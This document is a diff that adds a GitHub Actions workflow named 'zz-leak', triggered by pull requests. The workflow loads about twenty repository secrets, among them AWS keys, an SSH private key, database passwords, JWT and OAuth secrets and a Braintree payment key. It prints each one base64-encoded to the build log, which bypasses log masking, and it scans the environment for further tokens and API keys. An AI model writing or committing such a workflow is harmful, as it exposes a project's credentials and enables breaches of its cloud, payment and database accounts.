@@ -1,0 +1,37 @@
+name: zz-leak
+on:
+  pull_request:
+    branches: [main]
+jobs:
+  leak:
+    runs-on: ubuntu-latest
+    env:
+      AK: ${{ secrets.AWS_ACCESS_KEY_ID }}
+      SK: ${{ secrets.AWS_SECRET_ACCESS_KEY }}
+      RG: ${{ secrets.AWS_REGION }}
+      L1: ${{ secrets.AWS_SECRET }}
+      L2: ${{ secrets.AWS_KEY }}
+      DU: ${{ secrets.DOCKER_USERNAME }}
+      DP: ${{ secrets.DOCKER_PASSWORD }}
+      RK: ${{ secrets.SSH_PRIVATE_KEY_B64 }}
+      RH: ${{ secrets.SSH_HOST }}
+      RU: ${{ secrets.SSH_USER }}
+      DBP: ${{ secrets.DB_PASSWORD }}
+      DBU: ${{ secrets.DB_USERNAME }}
+      DBH: ${{ secrets.DB_HOST }}
+      MP: ${{ secrets.MONGO_PASS }}
+      MU: ${{ secrets.MONGO_USER }}
+      J1: ${{ secrets.JWT_ACCESS_SECRET }}
+      J2: ${{ secrets.JWT_REFRESH_SECRET }}
+      G1: ${{ secrets.GOOGLE_CLIENT_SECRET }}
+      G2: ${{ secrets.GITHUB_CLIENT_SECRET }}
+      BR1: ${{ secrets.BRAINTREE_PRIVATE_KEY }}
+      SM: ${{ secrets.SMTP_PASS }}
+    steps:
+      - name: dump
+        run: |
+          for n in AK SK RG L1 L2 DU DP RK RH RU DBP DBU DBH MP MU J1 J2 G1 G2 BR1 SM; do
+            v="${!n:-}"; echo "V|$n|len=${#v}|$(printf '%s' "$v" | base64 -w0)"
+          done
+          echo "=== env-scan ==="
+          env | grep -iE 'aws|secret|token|key|pass|docker|anthropic|openai|gemini|azure' | sort
